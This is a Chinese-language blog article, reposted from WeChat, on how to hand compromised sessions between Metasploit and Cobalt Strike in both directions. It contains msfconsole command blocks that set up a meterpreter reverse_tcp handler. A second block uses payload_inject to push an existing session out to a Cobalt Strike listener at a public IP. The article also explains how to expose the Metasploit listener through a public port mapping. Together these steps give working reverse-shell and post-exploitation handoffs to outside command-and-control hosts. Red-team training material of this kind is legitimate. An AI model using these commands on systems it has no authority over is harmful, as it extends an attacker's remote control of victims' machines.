> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247484295&idx=1&sn=e8542c707f698ba30d42b267d8de83f8&chksm=eaad83baddda0aac0edecc67eb42704f49289583f3cb5835c3c04ee4fedb5cb1ddc66430b329&scene=21#wechat_redirect)

MSF 和 CobaltStrike 联动

  

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC5ERJbGopDs6ynDIABQDiakOofnztUV8T9FrRBjp1FBibBlpXuraef7dHwx2PdPgXkQ2u1fIFiaP3ZBw/640?wx_fmt=gif)

目录

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC6T1Ahicengcu2gQ0PNKyQErs8Cy1Xj3DG6S05tSRd025I0Wk31utmMRRZt6kukoMx3wwsibXgv2y9Q/640?wx_fmt=png)

当获取了 CobaltStrike 类型的 session 后，想派生一个 MSF 类型的 shell

当获取了 MSF 类型的 session 后，想派生一个 CobaltStrike 类型的 shell

  

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5KIG4E7qWJo9LyhX3yxKPUvcYoLhUXlkn9gfJqa99wELGtG4qF9ic5tGAGWyibuspgibT5EmWYjOjPA/640?wx_fmt=png)

  

当获取了 CobaltStrike 类型的 session 后，想派生一个 MSF 类型的 shell

  

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5KIG4E7qWJo9LyhX3yxKPUvcYoLhUXlkn9gfJqa99wELGtG4qF9ic5tGAGWyibuspgibT5EmWYjOjPA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC40tDFjiceboIhw3MooIdVI7YoDmGe7SmGxwSbONgZ3Y5Oq5tetrbX55Q1SryNH2TJicCNjREqibOqEA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC40tDFjiceboIhw3MooIdVI7YoDmGe7SmGxwSbONgZ3Y5Oq5tetrbX55Q1SryNH2TJicCNjREqibOqEA/640?wx_fmt=png)

**在 MSF 上的操作：**

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.10.11
set lport 4444
exploit -j
```

**![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fU1ic6ZLeymY4EuV3dKxI3k30v92pTM5iaBC4FanpkFu5yBWIugNn2h8icsps0A9icEfbswTwrxbxT0Q/640?wx_fmt=png)**

**在 CobaltStrike 上的操作**

开启一个监听器 Listener，HOST 和 PORT 填我们 MSF 监听的地址 (这里需要注意，如果我们的 MSF 也是在内网中的话，需要将 MSF 的端口映射到公网地址)，这里我们将 Kali 的端口映射到了公网的 server.natappfree.cc:38615 (112.74.89.58:38615 )。

如果我们的公网 VPS 上安装了 MSF 的话 ，就不需要映射端口了。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fU1ic6ZLeymY4EuV3dKxI3kNUBOKYGdeicI79VmtQUs0wJTDvHtlx1vvODWBEFqAXlbMGZiaiapo64HQ/640?wx_fmt=png)

这里一定要注意，创建的 Listener 是 foreign!

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fU1ic6ZLeymY4EuV3dKxI3k1RbEP2WfAzq4I2R0FqlLOcz1IYFadiaEbnmaAnw016V4K0va1UUQaWQ/640?wx_fmt=png)

然后选中计算机，右键 ->Spawn，选择刚刚创建的监听器 MSF，然后我们的 MSF 即可看到成功获取了 meterpreter 会话

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fU1ic6ZLeymY4EuV3dKxI3kC2fHYJwhyG4HMTVtNFZH0BXnxrP1hBsB4SspFkTicflvCZI9VA2vMiaA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC40tDFjiceboIhw3MooIdVI7YoDmGe7SmGxwSbONgZ3Y5Oq5tetrbX55Q1SryNH2TJicCNjREqibOqEA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC40tDFjiceboIhw3MooIdVI7YoDmGe7SmGxwSbONgZ3Y5Oq5tetrbX55Q1SryNH2TJicCNjREqibOqEA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5KIG4E7qWJo9LyhX3yxKPUvcYoLhUXlkn9gfJqa99wELGtG4qF9ic5tGAGWyibuspgibT5EmWYjOjPA/640?wx_fmt=png)

  

当获取了 MSF 类型的 session 后，想派生一个 CobaltStrike 类型的 shell

  

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC5KIG4E7qWJo9LyhX3yxKPUvcYoLhUXlkn9gfJqa99wELGtG4qF9ic5tGAGWyibuspgibT5EmWYjOjPA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC40tDFjiceboIhw3MooIdVI7YoDmGe7SmGxwSbONgZ3Y5Oq5tetrbX55Q1SryNH2TJicCNjREqibOqEA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC40tDFjiceboIhw3MooIdVI7YoDmGe7SmGxwSbONgZ3Y5Oq5tetrbX55Q1SryNH2TJicCNjREqibOqEA/640?wx_fmt=png)

**注：只有 meterpreter 类型的 session 才能派生给 CS**

我们现在获得了一个 MSF 的 meterpreter 类型的 session，session id 为 1

首先在 CobaltStrike 上开启 Listener，

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fU1ic6ZLeymY4EuV3dKxI3kBa7NicBrs7agwxj7quMGJbxRV4w6kxgB5WJmByCJupB5PMPBSZTpyQA/640?wx_fmt=png)

然后在 MSF 中进行如下操作

```
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set DisablePayloadHandler true   #默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，所以这里我们设置为true
set lhost 48.94.225.140         #cobaltstrike监听的ip
set lport 14444                 #cobaltstrike监听的端口 
set session 1                   #这里是获得的session的id
exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2fU1ic6ZLeymY4EuV3dKxI3kffY1cGwC6ALQX8Uy5Pt7B9yMfF39BiczbpVvsQK0EAxZTgicKhm0QjTw/640?wx_fmt=png)

这样，我们的 CobaltStrike 上就可以收到 MSF 弹回来的 session 了。

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC40tDFjiceboIhw3MooIdVI7YoDmGe7SmGxwSbONgZ3Y5Oq5tetrbX55Q1SryNH2TJicCNjREqibOqEA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7QRTvkK2qC40tDFjiceboIhw3MooIdVI7YoDmGe7SmGxwSbONgZ3Y5Oq5tetrbX55Q1SryNH2TJicCNjREqibOqEA/640?wx_fmt=png)

END

来源：谢公子博客

责编：Vivian

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2edCjiaG0xjojnN3pdR8wTrKhibQ3xVUhjlJEVqibQStgROJqic7fBuw2cJ2CQ3Muw9DTQqkgthIjZf7Q/640?)

如果文中有错误的地方，欢迎指出。有想转载的，可以留言我加白名单。

最后，欢迎加入谢公子的小黑屋（安全交流群）(QQ 群：783820465)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SjCxEtGic0gSRL5ibeQyZWEGNKLmnd6Um2Vua5GK4DaxsSq08ZuH4Avew/640?)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2et9NHxRhN8exP4Ly6FKH9SFQtevncFtKIlfLdaxSwwqFxgkrUz1x12kPp3ueaJctagDUcyJDGJyA/640?)